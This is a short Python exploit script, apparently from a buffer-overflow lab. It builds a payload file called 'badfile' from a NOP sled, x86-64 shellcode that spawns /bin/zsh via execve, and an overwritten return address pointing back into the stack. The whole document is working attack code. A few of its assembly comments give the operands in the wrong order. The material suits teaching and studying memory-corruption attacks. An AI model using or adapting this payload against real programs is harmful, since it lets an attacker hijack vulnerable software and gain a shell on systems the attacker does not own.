shellcode = (
    "\x48\x31\xd2"                 # xorq %rdx, %rdx
    "\x52"                         # pushq %rdx
    "\x48\xb8\x2f\x62\x69\x6e\x2f\x7a\x73\x68"  # movq %rax, '/bin/zsh'
    "\x50"                         # pushq %rax
    "\x48\x89\xe7"                 # 11100111 movq %rdi, %rsp
    "\x48\x31\xf6"                 # 11110110 xorq %rsi, %rsi
    "\x48\x31\xC0"                 # 01001000 + 00110001 + 11000000 xorq %rax, %rax
    "\xB0\x3B"                     # mov $59, %al
    "\x0f\x05"                     # syscall
).encode('latin-1')

# 0x90 占一字节
content = bytearray(0x90 for _ in range(320))

start = 320 - len(shellcode)
content[start:] = shellcode

# ret 为恶意程序的存放地址
ret = 0x7fffffffdcd0 + start + 160
content[120:128] = (ret).to_bytes(8, byteorder='little')

file = open("./output/badfile", "wb")
file.write(content)
file.close()
